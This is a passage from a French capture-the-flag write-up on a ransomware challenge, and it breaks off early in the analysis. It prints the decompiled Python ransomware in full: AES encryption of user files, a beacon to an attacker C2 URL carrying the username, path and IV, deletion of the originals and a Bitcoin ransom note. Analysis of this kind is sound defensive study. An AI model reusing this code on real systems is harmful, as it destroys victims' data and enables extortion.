<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>[Santhacklaus 2019] - Jacques ! Au secours ! - Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)</title><meta name=Description content="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><meta property="og:title" content="[Santhacklaus 2019] - Jacques ! Au secours !"><meta property="og:description" content="One of our VIP clients, who wishes to remain anonymous, has apparently been hacked and all their important documents are now corrupted. Can you help us recover the files? We found a strange piece of software that might have caused all of this. MD5 of the file : ccaab91b06fc9a77f3b98d2b9164df8e Fichiers: http://cloud.id-iot.team/s/e2ZgLdHKwMoFQ8x
Etat des lieux Cette épreuve commence donc avec une archive zip contenant plusieurs fichiers:
Le fichier &ldquo;READ_THIS.txt&rdquo; contient un message charmant:"><meta property="og:type" content="article"><meta property="og:url" content="maki.bzh/writeups/santhacklaus2019jacquiesheerhask/"><meta property="og:image" content="/logo.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2019-12-22T21:57:40+08:00"><meta property="article:modified_time" content="2019-12-22T21:57:40+08:00"><meta property="og:site_name" content="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/logo.png"><meta name=twitter:title content="[Santhacklaus 2019] - Jacques ! Au secours !"><meta name=twitter:description content="One of our VIP clients, who wishes to remain anonymous, has apparently been hacked and all their important documents are now corrupted. Can you help us recover the files? We found a strange piece of software that might have caused all of this. MD5 of the file : ccaab91b06fc9a77f3b98d2b9164df8e Fichiers: http://cloud.id-iot.team/s/e2ZgLdHKwMoFQ8x
Etat des lieux Cette épreuve commence donc avec une archive zip contenant plusieurs fichiers:
Le fichier &ldquo;READ_THIS.txt&rdquo; contient un message charmant:"><meta name=application-name content="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><meta name=apple-mobile-web-app-title content="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=maki.bzh/writeups/santhacklaus2019jacquiesheerhask/><link rel=prev href=maki.bzh/writeups/santhacklaus2019naughtydockre/><link rel=next href=maki.bzh/writeups/santhacklaus2019goldenrush/><link rel=stylesheet href=/maki.bzh/css/style.min.css><link rel=preload href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css as=style onload="this.onload=null,this.rel='stylesheet'"><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css></noscript><link rel=preload href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css as=style onload="this.onload=null,this.rel='stylesheet'"><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"[Santhacklaus 2019] - Jacques ! Au secours !","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"maki.bzh\/writeups\/santhacklaus2019jacquiesheerhask\/"},"image":["\/images\/Apple-Devices-Preview.png"],"genre":"writeups","keywords":"santhacklaus, h25, mathis hammel, cryptography, file format, aes, python","wordcount":1795,"url":"maki.bzh\/writeups\/santhacklaus2019jacquiesheerhask\/","datePublished":"2019-12-22T21:57:40+08:00","dateModified":"2019-12-22T21:57:40+08:00","license":"This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher":{"@type":"Organization","name":"xxxx","logo":"\/lib\/images\/avatar.png"},"author":{"@type":"Person","name":"Maki"},"description":""}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem('theme')?localStorage.getItem('theme')==='dark':'dark'==='auto'?window.matchMedia('(prefers-color-scheme: dark)').matches:'dark'==='dark')&&document.body.setAttribute('theme','dark')</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=maki.bzh/ title="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><span class=header-title-pre><i class='far fa-kiss-wink-heart fa-fw' aria-hidden=true></i></span></a></div><div class=menu><div class=menu-inner><a class=menu-item href=/maki.bzh/posts/>Posts </a><a class=menu-item href=/maki.bzh/shorts/>Shorts </a><a class=menu-item href=/maki.bzh/offers/>Offers </a><a class=menu-item href=/maki.bzh/writeups/>Writeups </a><a class=menu-item href=/maki.bzh/tags/>Tags </a><a class=menu-item href=/maki.bzh/about/>About </a><span class="menu-item delimiter"></span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=maki.bzh/ title="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><span class=header-title-pre><i class='far fa-kiss-wink-heart fa-fw' aria-hidden=true></i></span></a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><a class=menu-item href=/maki.bzh/posts/ title>Posts</a><a class=menu-item href=/maki.bzh/shorts/ title>Shorts</a><a class=menu-item href=/maki.bzh/offers/ title>Offers</a><a class=menu-item href=/maki.bzh/writeups/ title>Writeups</a><a class=menu-item href=/maki.bzh/tags/ title>Tags</a><a class=menu-item href=/maki.bzh/about/ title>About</a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><main class=main><div class=container><div class="page single special"><h1 class="single-title animate__animated animate__pulse animate__faster">[Santhacklaus 2019] - Jacques ! Au secours !</h1><div class=content id=content><blockquote><p>One of our VIP clients, who wishes to remain anonymous, has apparently been hacked and all their important documents are now corrupted.
Can you help us recover the files? We found a strange piece of software that might have caused all of this.
MD5 of the file : ccaab91b06fc9a77f3b98d2b9164df8e
Fichiers: <a href=http://cloud.id-iot.team/s/e2ZgLdHKwMoFQ8x target=_blank rel="noopener noreffer">http://cloud.id-iot.team/s/e2ZgLdHKwMoFQ8x</a></p></blockquote><h2 id=etat-des-lieux>Etat des lieux</h2><p>Cette épreuve commence donc avec une archive zip contenant plusieurs fichiers:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_santhacklaus/jacqueschirac/upload_b0b0fa8588a7c488222e5715d5e4fc93.png data-srcset="/lib/images/writeups/2019_santhacklaus/jacqueschirac/upload_b0b0fa8588a7c488222e5715d5e4fc93.png, /lib/images/writeups/2019_santhacklaus/jacqueschirac/upload_b0b0fa8588a7c488222e5715d5e4fc93.png 1.5x, /lib/images/writeups/2019_santhacklaus/jacqueschirac/upload_b0b0fa8588a7c488222e5715d5e4fc93.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_santhacklaus/jacqueschirac/upload_b0b0fa8588a7c488222e5715d5e4fc93.png title=/lib/images/writeups/2019_santhacklaus/jacqueschirac/upload_b0b0fa8588a7c488222e5715d5e4fc93.png></p><p>Le fichier &ldquo;READ_THIS.txt&rdquo; contient un message charmant:</p><blockquote><p>We have hacked all your files. Buy 1 BTC and contact us at <a href=mailto:hacked@virus.com rel>hacked@virus.com</a></p></blockquote><p>Le fichier &ldquo;virus.cpython-37.pyc&rdquo; rappelle un fichier de python compilé. Malheureusement <a href=https://github.com/zrax/pycdc target=_blank rel="noopener noreffer">pycdc</a> ne décompile pas correctement le &ldquo;virus&rdquo;. Heureusement qu&rsquo;il existe des outils en ligne pour tout et n&rsquo;importe quoi:</p><blockquote><p><a href=https://python-decompiler.com/ target=_blank rel="noopener noreffer">https://python-decompiler.com/</a></p></blockquote><p>Le résultat est vraiment mieux, après corrections de quelques petites choses, on obtient le code suivant:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/python3</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>AES</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Random</span> <span class=kn>import</span> <span class=n>get_random_bytes</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span><span class=o>,</span> <span class=nn>getpass</span><span class=o>,</span> <span class=nn>os</span><span class=o>,</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=n>TARGET_DIR</span> <span class=o>=</span> <span class=s1>&#39;C:</span><span class=se>\\</span><span class=s1>Users&#39;</span>
</span></span><span class=line><span class=cl><span class=n>C2_URL</span> <span class=o>=</span> <span class=s1>&#39;https://c2.virus.com/&#39;</span>
</span></span><span class=line><span class=cl><span class=n>TARGETS</span> <span class=o>=</span> <span class=p>[</span><span class=sa>b</span><span class=s1>&#39;Scott Farquhar&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Lei Jun&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Reid Hoffman&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Zhou Qunfei&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Jeff Bezos&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Shiv Nadar&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Simon Xie&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Ma Huateng&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Ralph Dommermuth&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Barry Lam&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Nathan Blecharczyk&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Judy Faulkner&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;William Ding&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Scott Cook&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Gordon Moore&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Marc Benioff&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Michael Dell&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Yusaku Maezawa&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Yuri Milner&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Bobby Murphy&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Larry Page&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Henry Samueli&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Jack Ma&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Jen-Hsun Huang&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Jay Y. Lee&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Joseph Tsai&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Dietmar Hopp&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Henry Nicholas, III.&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Dustin Moskovitz&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Mike Cannon-Brookes&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Robert Miller&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Bill Gates&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Garrett Camp&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Lin Xiucheng&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Gil Shwed&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Sergey Brin&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Rishi Shah&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Denise Coates&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Zhang Fan&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Michael Moritz&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Robin Li&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Andreas von Bechtolsheim&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Brian Acton&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Sean Parker&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;John Doerr&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;David Cheriton&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Brian Chesky&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Wang Laisheng&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Jan Koum&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Jack Sheerack&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Terry Gou&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Adam Neumann&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;James Goodnight&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Larry Ellison&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Wang Laichun&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Masayoshi Son&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Min Kao&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Hiroshi Mikitani&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Lee Kun-Hee&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;David Sun&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Mark Scheinberg&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Yeung Kin-man&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;John Tu&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Teddy Sagi&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Frank Wang&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Robert Pera&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Eric Schmidt&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Wang Xing&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Evan Spiegel&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Travis Kalanick&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Steve Ballmer&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Mark Zuckerberg&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Jason Chang&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Lam Wai Ying&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Romesh T. Wadhwani&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Liu Qiangdong&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Jim Breyer&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Zhang Zhidong&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Pierre Omidyar&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Elon Musk&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;David Filo&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Joe Gebbia&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Jiang Bin&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Pan Zhengmin&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Douglas Leone&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Hasso Plattner&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Paul Allen&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Meg Whitman&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Azim Premji&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Fu Liquan&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Jeff Rothschild&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;John Sall&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Kim Jung-Ju&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;David Duffield&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Gabe Newell&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Scott Lin&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Eduardo Saverin&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Jeffrey Skoll&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Thomas Siebel&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Kwon Hyuk-Bin&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_username</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>getpass</span><span class=o>.</span><span class=n>getuser</span><span class=p>()</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>xorbytes</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>assert</span> <span class=nb>len</span><span class=p>(</span><span class=n>a</span><span class=p>)</span> <span class=o>==</span> <span class=nb>len</span><span class=p>(</span><span class=n>b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>res</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>c</span><span class=p>,</span> <span class=n>d</span> <span class=ow>in</span> <span class=nb>zip</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>res</span> <span class=o>+=</span> <span class=nb>bytes</span><span class=p>([</span><span class=n>c</span> <span class=o>^</span> <span class=n>d</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>res</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>lock_file</span><span class=p>(</span><span class=n>path</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>username</span> <span class=o>=</span> <span class=n>get_username</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>hsh</span> <span class=o>=</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=s1>&#39;md5&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>hsh</span><span class=o>.</span><span class=n>update</span><span class=p>(</span><span class=n>username</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>key</span> <span class=o>=</span> <span class=n>hsh</span><span class=o>.</span><span class=n>digest</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>cip</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>key</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>iv</span> <span class=o>=</span> <span class=n>get_random_bytes</span><span class=p>(</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>params</span> <span class=o>=</span> <span class=p>((</span><span class=s1>&#39;target&#39;</span><span class=p>,</span> <span class=n>username</span><span class=p>),</span> <span class=p>(</span><span class=s1>&#39;path&#39;</span><span class=p>,</span> <span class=n>path</span><span class=p>),</span> <span class=p>(</span><span class=s1>&#39;iv&#39;</span><span class=p>,</span> <span class=n>iv</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>C2_URL</span><span class=p>,</span> <span class=n>params</span><span class=o>=</span><span class=n>params</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>path</span><span class=p>,</span> <span class=s1>&#39;rb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=p>(</span><span class=n>fi</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>path</span> <span class=o>+</span> <span class=s1>&#39;.hacked&#39;</span><span class=p>,</span> <span class=s1>&#39;wb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=p>(</span><span class=n>fo</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>block</span> <span class=o>=</span> <span class=n>fi</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>while</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>block</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=k>while</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                        <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>block</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mi>16</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                            <span class=n>block</span> <span class=o>+=</span> <span class=nb>bytes</span><span class=p>([</span><span class=mi>0</span><span class=p>])</span>
</span></span><span class=line><span class=cl>                        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                            <span class=k>break</span>
</span></span><span class=line><span class=cl>                    <span class=n>cipherblock</span> <span class=o>=</span> <span class=n>cip</span><span class=o>.</span><span class=n>encrypt</span><span class=p>(</span><span class=n>xorbytes</span><span class=p>(</span><span class=n>block</span><span class=p>,</span> <span class=n>iv</span><span class=p>))</span>
</span></span><span class=line><span class=cl>                    <span class=n>iv</span> <span class=o>=</span> <span class=n>cipherblock</span>
</span></span><span class=line><span class=cl>                    <span class=n>fo</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>cipherblock</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=n>block</span> <span class=o>=</span> <span class=n>fi</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=k>break</span>
</span></span><span class=line><span class=cl>    <span class=n>os</span><span class=o>.</span><span class=n>unlink</span><span class=p>(</span><span class=n>path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>lock_files</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>username</span> <span class=o>=</span> <span class=n>get_username</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>username</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>username</span> <span class=ow>in</span> <span class=n>TARGETS</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>directory</span><span class=p>,</span> <span class=n>_</span><span class=p>,</span> <span class=n>filenames</span> <span class=ow>in</span> <span class=n>os</span><span class=o>.</span><span class=n>walk</span><span class=p>(</span><span class=n>TARGET_DIR</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>filename</span> <span class=ow>in</span> <span class=n>filenames</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>filename</span><span class=o>.</span><span class=n>endswith</span><span class=p>(</span><span class=s1>&#39;.hacked&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                    <span class=k>continue</span>
</span></span><span class=line><span class=cl>                <span class=n>fullpath</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>directory</span><span class=p>,</span> <span class=n>filename</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;Encrypting&#39;</span><span class=p>,</span> <span class=n>fullpath</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>lock_file</span><span class=p>(</span><span class=n>fullpath</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>TARGET_DIR</span><span class=p>,</span> <span class=s1>&#39;READ_THIS.txt&#39;</span><span class=p>),</span> <span class=s1>&#39;wb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=p>(</span><span class=n>fo</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>fo</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;We have hacked all your files. Buy 1 BTC and contact us at hacked@virus.com</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>lock_files</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>Bien plus simple à analyser.</p><h2 id=analyse-du-code-python>Analyse du code python</h2><p>Rien qu&rsquo;avec les imports, on voit que le malware va faire de l&rsquo;AES et probablement générer clé / iv de manière aléatoire. Ensuite, les variables globales peuvent interpeler:</p><ul><li>TARGET_DIR: le repertoire à chiffrer;</li><li>C2_URL: l&rsquo;url du serveur de command and control de l&rsquo;attaquant, en l&rsquo;occurence il n&rsquo;existe pas / plus;</li><li>TARGETS: une ribambelle de noms et prénoms.</li></ul><p>La fonction qui va être intéressante est <code>lock_file(path)</code>. Les premières lignes vont servir à générer la clé AES:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>username</span> <span class=o>=</span> <span class=n>get_username</span><span class=p>()</span>
